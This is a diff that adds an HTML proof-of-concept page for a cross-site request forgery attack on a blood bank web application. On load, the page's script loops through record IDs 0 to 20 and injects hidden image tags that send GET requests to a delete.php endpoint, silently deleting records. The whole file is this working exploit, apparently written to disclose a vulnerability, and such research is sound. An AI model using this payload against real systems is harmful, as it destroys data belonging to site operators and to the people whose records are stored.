@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h2>CSRF Proof of Concept for Deleting Blood Bank Records</h2>
+    <script>
+        // Define the target URL
+        const targetUrl = "http://localhost/bloodbank/file/delete.php";
+
+        // Loop through possible bid values (0 to 20)
+        for (let bid = 0; bid <= 20; bid++) {
+            // Create an image element for each bid value to send the GET request
+            let img = document.createElement("img");
+            img.src = `${targetUrl}?bid=${bid}`;
+            img.style.display = "none";  // Hide the image from view
+            document.body.appendChild(img);
+        }
+    </script>
+</body>
+</html>
+
